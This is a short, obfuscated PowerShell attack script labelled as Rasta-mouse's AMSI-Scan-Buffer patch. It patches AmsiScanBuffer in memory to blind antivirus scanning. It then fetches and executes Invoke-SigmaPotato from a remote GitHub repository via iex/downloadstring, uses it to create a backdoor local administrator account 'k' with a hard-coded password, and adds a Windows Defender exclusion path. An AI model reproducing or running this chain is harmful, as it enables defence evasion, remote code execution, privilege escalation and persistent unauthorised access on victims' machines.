#Rasta-mouses Amsi-Scan-Buffer patch \n
$qyWNl6DdPGXdbi = @"
using System;
using System.Runtime.InteropServices;
public class qyWNl6DdPGXdbi {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr wG1Bj6aEJwEU, string UVUsZ5yE3c9In);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr JffA71xHe, UIntPtr AoP9q9F1iYzasdNM_P, uint WcVUnKj, out uint g3ejk2xrDxo2xmIqnT1);
}
"@

Add-Type $qyWNl6DdPGXdbi

$KfzxpzGt = [qyWNl6DdPGXdbi]::LoadLibrary("$(('ámsì.'+'dll').nOrmalIZE([Char]([Byte]0x46)+[chAR](111)+[cHaR](114*26/26)+[CHAR](109)+[CHar](47+21)) -replace [ChaR](29+63)+[chaR](112*26/26)+[cHar]([byTE]0x7b)+[cHAR]([byTe]0x4d)+[ChaR](110*105/105)+[CHAR]([byTe]0x7d))")
$_FiyUITLoF1Tzgzw = [qyWNl6DdPGXdbi]::GetProcAddress($KfzxpzGt, "$([CHar]([bYte]0x41)+[CHar]([BYte]0x6d)+[char]([BYTe]0x73)+[Char](84+21)+[char]([byTE]0x53)+[ChAR]([BYTE]0x63)+[ChaR]([byTe]0x61)+[cHAR](110)+[chAR](66*56/56)+[chAR]([bYTE]0x75)+[ChAr](102*38/38)+[ChAR](102*24/24)+[char]([BytE]0x65)+[CHaR]([bytE]0x72))")
$p = 0
[qyWNl6DdPGXdbi]::VirtualProtect($_FiyUITLoF1Tzgzw, [uint32]5, 0x40, [ref]$p)
$vmGnyYH9 = "0xB8"
$wHruSs0_xHzKkXGeNg = "0x57"
$lmI = "0x00"
$LtQOWK4I4a0 = "0x07"
$wtuEsUEDmqmr = "0x80"
$UXuslNg7ZlhPa3M = "0xC3"
$FVrQhgUrc = [Byte[]] ($vmGnyYH9,$wHruSs0_xHzKkXGeNg,$lmI,$LtQOWK4I4a0,+$wtuEsUEDmqmr,+$UXuslNg7ZlhPa3M)
[System.Runtime.InteropServices.Marshal]::Copy($FVrQhgUrc, 0, $_FiyUITLoF1Tzgzw, 6)
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/farzas1/bad/refs/heads/main/Invoke-SigmaPotato.ps1')
Invoke-SigmaPotato -command "net user k kopq@123 /add"
Invoke-SigmaPotato -command "net localgroup administrators k /add"
Invoke-SigmaPotato -command "powershell Add-MpPreference -ExclusionPath C:\programdata"




